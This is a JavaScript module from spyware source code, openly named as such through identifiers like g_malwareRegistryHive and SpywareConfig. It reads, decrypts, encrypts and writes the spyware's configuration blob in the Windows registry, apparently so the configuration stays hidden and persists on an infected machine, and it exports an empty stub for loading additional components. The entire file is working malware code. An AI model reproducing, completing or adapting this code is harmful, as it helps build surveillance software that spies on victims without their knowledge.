var reg = process.binding("registry");


function RegReadObject(keyname) {
    var x = new reg.WindowsRegistry(
		process.g_malwareRegistryHive,
		process.g_malwareRegistryPath, KEY_READ, true
	);
    var valueType = x.GetDataType(keyname);
    if (valueType == REG_BINARY) {
        return x.ReadBuffer(keyname);
    }
    else if (valueType == REG_SZ) {
        return x.ReadString(keyname);
    }
    else if (valueType == REG_DWORD) {
        return x.ReadDword(keyname);
    }
}

function RegWriteObject(keyname, obj) {
    var x = new reg.WindowsRegistry(
		process.g_malwareRegistryHive,
		process.g_malwareRegistryPath, KEY_WRITE, true
	);

    if (Buffer.isBuffer(obj)) {
        return x.WriteBuffer(keyname, obj);
    }
    else if (typeof obj == "string") {
        return x.WriteString(keyname, obj);
    }
    else return -1;
}

function SpLoadConfig() {
    try {
        process.g_scfg = '';
        var readedBuffer = RegReadObject(process.g_SpConfigKey);

        if (typeof (readedBuffer) !== 'undefined') {
            readedBuffer.encryptDecrypt();
            process.configBlob = readedBuffer;

            process.g_scfg = process
                .protobuf_spyware_messages
                .SpywareConfig
                .decode(readedBuffer);

            
        }
    }
    catch (e) {
        console.log(e);
    }
}

function SpSaveConfig(config) {
    var encryptedcfg = new Buffer(config);
    encryptedcfg.encryptDecrypt()

    RegWriteObject(
		process.g_SpConfigKey,
		encryptedcfg
	);
}

function LoadAdditionalComponents(config, cb) {

}

exports.LoadAdditionalComponents = LoadAdditionalComponents;
exports.SpSaveConfig = SpSaveConfig;
exports.SpLoadConfig = SpLoadConfig;